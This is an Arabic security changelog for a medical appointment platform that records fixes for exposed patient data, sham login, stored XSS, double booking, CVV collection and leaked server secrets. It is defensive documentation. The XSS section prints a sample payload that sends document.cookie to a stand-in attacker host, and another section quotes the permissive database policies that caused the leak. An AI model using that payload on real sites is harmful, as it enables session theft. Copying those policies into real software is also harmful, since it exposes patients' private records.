# سجل التغييرات الأمنية —منصة شفاء

تاريخ: أكتوبر 2026
النطاق: النسخة 2.0 (Full-Stack)

---

## الملخص

النسخة السابقة كانت واجهة أمامية تعمل بالكامل داخل المتصفح، مع تخزين
بيانات المرضى في `localStorage` و "أنظمة" مصادقة ودفع كانت محاكاة.
هذا المستند يوثّق ما وجدناه وما أصلاحناه.

---

## ثغرات تم اكتشافها وإصلاحها

### 1. 🔴 تسريب بيانات المرضى (PHI) — الأخطر

**المشكلة**

جدول `appointments` في Supabase كان مفتوحاً بالكامل للعامة عبر REST API.
مفتاح `anon` كان مكتوباً داخل `js/app.js` — أي داخل كود يراه كل زائر.
تحققتُ من هذا باستعلامات غير مُتلِفة:

| العملية | النتيجة قبل |
|---|---|
| قراءة كل المواعيد | ✅ ناجحة (أسماء + أرقام هواتف) |
| تعديل أي موعد | ✅ ناجح |
| حذف أي موعد | ✅ ناجح |

**السبب**

`server/supabase_schema.sql` كان يحتوي سياسات مثل:

```sql
USING (auth.uid() = patient_id OR true)   -- قراءة كل شيء للجميع
WITH CHECK (true)                          -- إدراج من أي شخص
USING (true)                               -- تعديل من أي شخص
```

**الإصلاح**

- ترحيل `002_security_lockdown.sql`: إلغاء كل صلاحيات `anon` و`authenticated`
  على كل الجداول، وتفعيل RLS بلا سياسات (منع افتراضي)
- إضافة فحص `has_table_privilege` في نهاية الترحيل يفشل الترحيل إن بقيت
  أي صلاحية
- **حذف المفتاح من الواجهة** وإزالة عميل Supabase من `index.html`

**النتيجة**

المتصفح لم يعد يملك أي طريق للوصول لقاعدة البيانات. كل طلب يمرّ عبر
الخادم الذي يتحقق من الهوية والصلاحيات.

### 2. 🔴 مصادقة وهمية — الدخول بأي كلمة سر

**المشكلة**

`handleLoginSubmit` كان يحاول Supabase ثم **يتجاهل الفشل تماماً** ويسجّل
الدخول محلياً. أي شخص كان يكتب أي كلمة سر ويدخل، وكان يحصل على دور
"طبيب" إذا كان الاسم يحتوي `doc`.

**الإصلاح**

مصفحات تسجيل الدخول والتسجيل الجديدة تستدعي `/api/auth/login` و
`/api/auth/signup`. التحقق يتم بـ bcrypt (12 جولة). عند عدم وجود
المستخدم يُجرى مقارنة وهمية (bcrypt hash ثابت) لتوحيد زمن الاستجابة
ومنع تعداد الحسابات.

### 3. 🔴 ثغرة XSS مخزّنة

**المشكلة**

`renderDoctorDashboard` و`renderQueue` يحقنان اسم المريض ورقم هاتفه في
`innerHTML` بدون تهريب. مثال على الاستغلال:

```javascript
// المريض يكتب هذا كاسمه عند الحجز:
<img src=x onerror="fetch('https://evil.com?c='+document.cookie)">
```

يُنفَّذ هذا الكود داخل جهاز الطبيب عند فتح اللوحة. والأسوأ: كان اسم
المريض يُحقن أيضاً داخل **سلسلة JavaScript** داخل سمة HTML
(`onclick="sendWhatsAppNotice('...', '${apt.patientName}')"`)، وهو
مسار تهريب إضافي.

**الإصلاح (طبقتان)**

1. **على الخادم** — `nameSchema` في `server/lib/validation.js` يرفض أي
   اسم يحتوي `<` أو `>`
2. **على الواجهة** — `api.escape()` في `js/api.js` يُطبَّق على كل قيمة
   قادمة من قاعدة البيانات، والأزرار أصبحت تستخدم **تفويض الأحداث**
   عبر `data-*` بدل حقن البيانات داخل `onclick`

> Defense in depth: الطبقتان مستقلتان، فشل إحداهما لا يعني انقطاع الحماية.

### 4. 🟠 عدم منع الحجز المزدوج

**المشكلة**

لا يوجد أي فحص لتعارض التوقيت. مريضان يمكن أن يحجزا نفس التوقيت،
ورقم الدور كان يُحسب في المتصفح كـ `max + 1`.

**الإصلاح**

- فهرس فريد جزئي على `(doctor_id, appt_date, appt_time)` حيث الحالة
  ليست `cancelled`
- ترقيم الدور داخل **معاملة مع قفل صف** (`SELECT ... FOR UPDATE`)،
  فيضمن التسلسل حتى مع الطلبات المتزامنة
- رسالة خطأ عربية واضحة عند التعارض

### 5. 🔴 مطالبة المستخدم برقم CVV

**المشكلة**

نموذج الدفع كان يطلب رقم البطاقة و**رمز الأمان CVV** داخل المتصفح،
ثم "يحاكي" الدفع بـ `setTimeout`. لا يوجد أي اتصال ببوابة دفع.

**الإصلاح**

أُزيل النموذج بالكامل وحلّ محلّه شرح بأن الدفع غير مفعّل. عند تفعيله
ستتم العملية في صفحة مستضافة من Chargily (متوافقة PCI DSS) ولا يمرّ
رقم البطاقة أو CVV في شيفرتنا أبداً.

> مخالفة PCI DSS حقيقية: أي موقع يلمس بيانات البطاقة يصبح مسؤولاً عن
> كامل متطلبات الامتثال.

### 6. 🔴 تسريب الأسرار عبر الخادم الثابت

**المشكلة**

لو اكتفينا بإضافة Express لتقديم `index.html`، لأصبح `GET /.env` في
متناول أي شخص — أي كلمة مرور قاعدة البيانات ومفتاح الجلسات.

**الإصلاح**

حارس في `server/index.js` يمنع مسارات `server/` و`node_modules/` وأي
اسم ملف يبدأ بنقطة. مُتحقَّق منه:

```
GET /.env                         -> 404
GET /server/config.js             -> 404
GET /node_modules/express/...     -> 404
GET /.gitignore                   -> 404
```
